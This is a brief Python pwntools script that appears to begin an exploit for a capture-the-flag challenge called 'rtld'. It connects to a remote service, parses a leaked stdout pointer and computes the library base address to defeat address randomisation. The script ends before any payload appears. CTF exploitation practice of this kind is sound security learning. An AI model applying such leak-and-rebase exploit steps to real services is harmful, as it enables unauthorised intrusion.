from pwn import *

port = 0
rem = remote("", port)

lib = ELF("./Pwnable/rtld/problem/rtld")

rem.recvuntil(b'stdout: ')
stdout_addr = int(rem.recvn(14)[2:].decode(), 16)
lib_base = stdout_addr - lib.symbols['_IO_2_1_stdout_']
ld_base = lib_base